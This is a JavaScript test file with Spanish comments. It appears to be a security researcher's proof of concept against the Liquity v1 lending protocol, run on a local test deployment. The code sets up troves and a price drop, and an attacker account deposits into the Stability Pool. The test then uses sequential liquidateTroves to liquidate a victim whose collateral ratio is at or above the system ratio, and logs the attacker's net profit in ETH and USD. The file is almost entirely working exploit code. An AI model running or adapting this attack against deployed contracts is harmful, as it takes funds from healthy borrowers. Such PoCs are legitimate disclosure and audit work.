/* Variante SECUENCIAL (liquidateTroves) del PoC de PnL neto — ruta prod L583. */
const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")
const th = testHelpers.TestHelper
const dec = th.dec, toBN = th.toBN, ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

contract("PoC Sequential Net PnL: Liquity v1 prod 5174ecd", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin] = accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, lusdToken

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(contracts.troveManager.address,
      contracts.stabilityPool.address, contracts.borrowerOperations.address)
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet; stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager; borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool; lusdToken = contracts.lusdToken
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(toBN(dec(100,16)), m, ZERO_ADDRESS, ZERO_ADDRESS,
      { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }
  const ETH = toBN(dec(1,18))
  const bal = async a => toBN(await web3.eth.getBalance(a))

  it("SECUENCIAL: liquidateTroves captura a la victima con ICR >= TCR real", async () => {
    await priceFeed.setPrice(dec(200,18)); await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000,18)), toBN(dec(500000,18)), carol)
    await openExact(toBN("24750000000000000000"), toBN(dec(3300,18)), alice)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000,18)), bob)
    await openExact(toBN(dec(4800,18)), toBN(dec(600000,18)), dennis)
    await priceFeed.setPrice(dec(170,18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    console.log("TCR real", realTCR.toString(), "recoveryMode", (await th.checkRecoveryMode(contracts)).toString())
    console.log("carol ICR", (await troveManager.getCurrentICR(carol, P)).toString())

    const erinSeed = toBN(dec(50000,18))
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })

    const wealth = async who => {
      const w = await bal(who), l = await lusdToken.balanceOf(who)
      const c = await stabilityPool.getCompoundedLUSDDeposit(who)
      const g = await stabilityPool.getDepositorETHGain(who)
      return w.add(g).add(l.add(c).mul(ETH).div(P))
    }
    const wB = await wealth(dennis)
    const ethB = await bal(dennis), lusdB = await lusdToken.balanceOf(dennis)

    // SECUENCIAL: liquidateTroves(5) - el trigger bob tiene el ICR mas bajo
    const tx = await troveManager.liquidateTroves(5, { from: owner })
    for (const log of tx.logs) if (log.event === "TroveLiquidated")
      console.log("LIQ", log.args._borrower.slice(0,8), "debt", log.args._debt.toString())

    console.log("carol status:", (await troveManager.getTroveStatus(carol)).toString())
    const comp = await stabilityPool.getCompoundedLUSDDeposit(dennis)
    await stabilityPool.withdrawFromSP(comp, { from: dennis })
    const wA = await wealth(dennis)
    const dW = wA.sub(wB)
    console.log("ataque SECUENCIAL:")
    console.log("  ETH retirado:", (await bal(dennis)).sub(ethB).toString())
    console.log("  LUSD delta:", (await lusdToken.balanceOf(dennis)).sub(lusdB).toString())
    console.log("  >> PnL NETO de riqueza (ETH):", dW.div(ETH).toString())
    console.log("  >> PnL NETO (USD @170):", dW.mul(P).div(ETH).div(toBN(dec(1,18))).toString())
    console.log("  SP ETH:", (await web3.eth.getBalance(stabilityPool.address)).toString())
  })
})
